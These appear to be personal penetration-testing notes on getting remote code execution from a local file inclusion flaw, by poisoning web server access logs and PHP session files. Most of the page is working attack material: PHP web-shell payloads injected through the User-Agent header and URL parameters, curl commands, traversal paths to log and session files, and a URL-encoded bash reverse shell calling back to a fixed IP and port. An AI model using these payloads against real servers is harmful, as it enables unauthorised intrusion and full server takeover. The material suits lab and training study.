There are various ways to abuse LFI vulnerabilities to poison logs and gain RCE.
## Server Log Poisoning
If an LFI vulnerability is present, we can potentially alter log files to enable command execution.

Requirements: LFI and log file

Example: `index.php?page=../../../../var/log/apache2/access.log

Exploitation Example
```bash
# Default locations of logs
/var/log/apache2/
C:\xampp\apache\logs\
/var/log/nginx/
C:\nginx\log\

# Example
index.php?page=../../../../var/log/apache2/access.log

# Intercept request and modify User-Agent field:
User-Agent: <?php echo system($_GET['cmd']); ?>  # Burp
# cURL Alternative
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison

# Send

# Visit site and append cmd to url
index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
```
See [[Web Shells]] if not php

With this, you can append more complex commands via URL encoding

Example Commands:
```bash
ls%20-la

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.161%2F4444%200%3E%261%22
...
```


## PHP Session Poisoning
Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies

Storage of PHPSESSID on servers
```bash
# session file locations on back end
/var/lib/php/sessions/
C:\Windows\Temp
```

Attack Chain
```bash
# Check PHPSESSID cookie in current session
CTRL+Shift+C > Storage    # Name = PHPSESSION, Value = cookie

# View PHPSESSID contents via LFI
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSION_COOKIE>

# Identify values we can control
ie: 'page' we can control with paramater... index.php?<paramater>=<page> #language

# Write php code to the session file
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

# LFI Web shell
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```